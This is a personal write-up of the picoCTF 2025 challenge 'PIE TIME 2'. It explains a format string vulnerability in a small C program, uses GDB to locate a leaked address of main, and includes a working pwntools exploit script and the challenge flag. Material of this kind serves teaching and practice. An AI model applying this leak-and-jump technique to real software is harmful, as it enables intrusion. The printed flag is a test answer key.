---
title: "picoCTF 2025: PIE TIME 2"
tags:
  - ctf
date: 2025-03-23
---
# Problem
![[media/ctf/picoCTF/PIE TIME 2/description.png]]
# Solution
For some reason, I (regretfully) didn't solve this during the competition period for [[ctf/picoCTF/2025/2025 Writeup|picoCTF 2025]]. I realized this while writing my solution for [[PIE TIME]] after the fact, and was able to solve this in only a few minutes. In any case, here's how I did so.

This time, we're not given the address of `main`; however, similar to [[PIE TIME]], `win` is in the same address relative to `main`, `-0x96`.

To start, let's take a look at `call_functions`:

```c
void call_functions() {  
 char buffer[64];  
 printf("Enter your name:");  
 fgets(buffer, 64, stdin);  
 printf(buffer);  
  
 unsigned long val;  
 printf(" enter the address to jump to, ex => 0x12345: ");  
 scanf("%lx", &val);  
  
 void (*foo)(void) = (void (*)())val;  
 foo();  
}
```

So our input is written to `buffer` then printed in a bare `printf`. If our input contains a format string, it will be evaluated by `printf`. This is a format string vulnerability! 

Suppose we input the pointer format string, `%p`, what happens? Well, `%p` will be stored in `buffer`, then `printf(buffer)` will be evaluated as `printf("%p")` which prints the address of `buffer`. And if we input `%p %p`, `printf("%p %p")` will print the address of `buffer`, *followed by the address of the next item on the stack*. So if we keep adding `%p`, we can keep printing items on the stack. However, since there are canaries, we are limited to 64 characters. This isn't a problem considering we only need 5 (well, 6 if you consider the null-terminator).

Let's throw `vuln` into GDB. When asked for my name, I'll give as many `%p`'s as I can: 

```
%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
```

This segfaults, but it doesn't really matter for now:

![[fuzzing_stack.png]]

What we're really after is the stack register, `rsp`. Entering `x/25gx $rsp` will display the addresses of 25 items on the stack:

![[rsp.png]]

`main` has to be in here somewhere, so I incrementally checked each value using `x/gx <address>`. Eventually, we find that the 25th item is main:

![[main_address.png]]

Therefore, the 25th item on the stack is `main` -> by using the format string `%25$p`, we can print the address of `main`!

The rest is the same as the previous challenge:

![[final.png]]
## Script
```python
from pwn import *  
  
hostname = ...  
port = ...  
  
p = process("./vuln")  
# p = remote(hostname, port)  
p.recvuntil(b"name:")  
p.sendline(b"%25$p")  
main_addr = int(p.recvline().strip(), 16)  
win_addr = main_addr - 0x96  
p.sendline(hex(win_addr))  
p.recvuntil(b"You won!\n")  
flag = p.recvline()  
print(flag.strip().decode("utf-8"))  
p.close()
```
## Flag
`picoCTF{p13_5h0u1dn'7_134k_4f15e15f}`